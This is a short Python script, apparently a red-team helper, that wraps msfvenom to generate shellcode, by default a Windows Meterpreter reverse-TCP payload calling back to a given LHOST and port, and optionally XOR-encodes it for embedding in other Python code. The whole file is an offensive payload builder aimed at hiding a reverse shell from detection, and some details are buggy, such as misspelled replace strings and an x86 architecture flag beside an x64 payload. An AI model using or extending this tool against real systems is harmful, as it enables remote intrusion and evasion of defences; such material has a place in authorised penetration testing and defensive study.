# (m4ud)
import subprocess
import argparse


def xor_encrypt(shellcode, key):
    """Encrypts the shellcode w XOR encryption method"""
    key = key.encode()
    encrypted_shellcode = bytearray()
    for i, c in enumerate(shellcode):

        if i % 2 == 0:
            z = shellcode[i:i+2]
            x = int(z, base=16)
            encrypted_shellcode.append(x ^ int(key))
            # better enc(todo)
            #encrypted_shellcode.append(x ^ int(str(key[i % len(key)]), 16))
    print("m4ud xor enc for py shellcode")
    print("\r\nShellcode size: "+ str(len(encrypted_shellcode))+ "\r\n")
    return encrypted_shellcode

def main():
    parser = argparse.ArgumentParser(description='Wrapper for msfvenom')
    parser.add_argument('-p', '--payload', required=True, help='The payload to be generated', nargs='?', default="windows/x64/meterpreter/reverse_tcp")
    parser.add_argument('-e', '--encryption', required=False, help='Encryption method')
    parser.add_argument('-k', '--key', required=False, help='Key for encryption')
    parser.add_argument('-lhost', '--lhost', required=True, help='The target IP')
    parser.add_argument('-lport', '--lport', required=True, help='The target port')
    args = parser.parse_args()

    msfvenom_output = subprocess.run(['msfvenom', '-p', args.payload, '-f', 'python','-v','shellcode', '-a', 'x86', 'LHOST='+args.lhost, 'LPORT='+args.lport], capture_output=True)
    shellcode = msfvenom_output.stdout.decode().strip(" ")

    lines = [shellcode[i:i+60] for i in range(0, len(shellcode), 60)]
    if args.encryption == 'xor':
        shellcode += "\""
        shellcode = shellcode.replace("\" +\n\"", "")
        shellcode = shellcode.replace("shellcode =  b\"", "")
        shellcode = shellcode.replace("\"\n\"","")
        shellcode = shellcode.replace("\"\nshellcode += b\"", "")
        shellcode = shellcode.replace("\\x","")
        shellcode = bytearray(shellcode.encode())
        encrypted_shellcode = xor_encrypt(shellcode, args.key)
        #print(shellcode)
        print("EncShellcode = b", end="")
        print("\"", end="")
        for i, b in enumerate(encrypted_shellcode):
            print("\\x%02x" % b, end="")
            if (i+1) % 15 == 0:
                print("\"")
                print("EncShellcode += b\"", end="")
        print("\"")
    else:
        shellcode = shellcode.replace('shelcode =','OShellcode = ')
        shellcode = shellcode.replace('shelcode +=','OShellcode += ')
        print(shellcode)

if __name__ == '__main__':
    main()
